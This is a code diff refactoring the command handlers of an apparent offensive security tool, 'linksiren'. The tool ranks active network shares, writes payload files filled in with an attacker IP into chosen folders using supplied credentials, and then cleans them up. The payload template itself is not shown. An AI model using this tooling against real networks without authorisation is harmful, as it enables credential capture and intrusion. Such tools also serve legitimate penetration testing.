@@ -19,6 +19,7 @@ Functions:
 import json
 from datetime import datetime
 from pathlib import Path
+import sys
 from linksiren.impure_functions import (
     read_targets,
     get_sorted_rankings,
@@ -72,7 +73,7 @@ def handle_generate(args):
     write_payload_local(args.payload, payload_contents)
 
 
-def handle_rank(args, domain, username, password):
+def handle_rank(args, credentials, log_queue):
     """
     Handles the ranking process for the given domain using the provided credentials and arguments.
     Args:
@@ -92,14 +93,21 @@ def handle_rank(args, domain, username, password):
     threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
     targets = read_targets(args.targets)
     sorted_rankings = get_sorted_rankings(
-        targets, domain, username, password, threshold_date, args.max_depth, args.fast
+        targets=targets,
+        credentials=credentials,
+        active_threshold_date=threshold_date,
+        max_depth=args.max_depth,
+        go_fast=args.fast,
+        log_queue=log_queue,
+        max_concurrency=args.max_concurrency,
+        ignore_folders=args.ignore_shares,
     )
 
     with open("folder_rankings.txt", mode="w", encoding="utf-8") as f:
         f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))
 
 
-def handle_identify(args, domain, username, password):
+def handle_identify(args, credentials, log_queue):
     """
     Handles the identification process based on the provided arguments and credentials.
 
@@ -121,20 +129,19 @@ def handle_identify(args, domain, username, password):
     targets = read_targets(args.targets)
     sorted_rankings = get_sorted_rankings(
         targets=targets,
-        domain=domain,
-        username=username,
-        password=password,
+        credentials=credentials,
         active_threshold_date=threshold_date,
         max_depth=args.max_depth,
         go_fast=args.fast,
+        log_queue=log_queue,
+        max_concurrency=args.max_concurrency,
+        ignore_folders=args.ignore_shares,
     )
-    filtered_targets = filter_targets(
-        targets, sorted_rankings, args.max_folders_per_target
-    )
-    write_list_to_file(filtered_targets, "folder_targets.txt")
+    filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
+    write_list_to_file(filtered_targets, "payload_targets.txt")
 
 
-def handle_deploy(args, domain, username, password):
+def handle_deploy(args, credentials):
     """
     Handles the deployment of payloads to specified targets.
     Args:
@@ -163,18 +170,18 @@ def handle_deploy(args, domain, username, password):
             payload_contents = template_contents.format(attacker_ip=args.attacker)
 
     for target in targets:
-        target.connect(user=username, password=password, domain=domain)
+        target.connect(credentials)
         for path in target.paths:
-            write_successful = target.write_payload(
+            new_payload_path = target.write_payload(
                 path=path, payload_name=args.payload, payload=payload_contents
             )
-            if write_successful is True:
-                payloads_written.append(f"\\\\{target.host}\\{path}")
+            if new_payload_path is not None:
+                payloads_written.append(new_payload_path)
 
-    write_list_to_file(payloads_written, "payloads_written.txt", "a")
+    write_list_to_file(payloads_written, "payloads_written.txt", "w")
 
 
-def handle_cleanup(args, domain, username, password):
+def handle_cleanup(args, credentials):
     """
     Handles the cleanup process by connecting to each target and deleting specified payloads.
 
@@ -189,8 +196,19 @@ def handle_cleanup(args, domain, username, password):
     Returns:
         None
     """
+    payloads_not_deleted = []
     targets = read_targets(args.targets)
     for target in targets:
-        target.connect(user=username, password=password, domain=domain)
-        for path in target.paths:
-            target.delete_payload(path, args.payload)
+        target.connect(credentials)
+        payloads_not_deleted = target.delete_payloads()
+
+    write_list_to_file(payloads_not_deleted, "payloads_not_deleted.txt", "w")
+
+    if len(payloads_not_deleted) == 0:
+        print("All payloads deleted successfully.")
+    else:
+        print(
+            "Some payloads could not be deleted. See 'payloads_not_deleted.txt' "
+            "and CRITICAL level events in linksiren.log for details.",
+            file=sys.stderr,
+        )
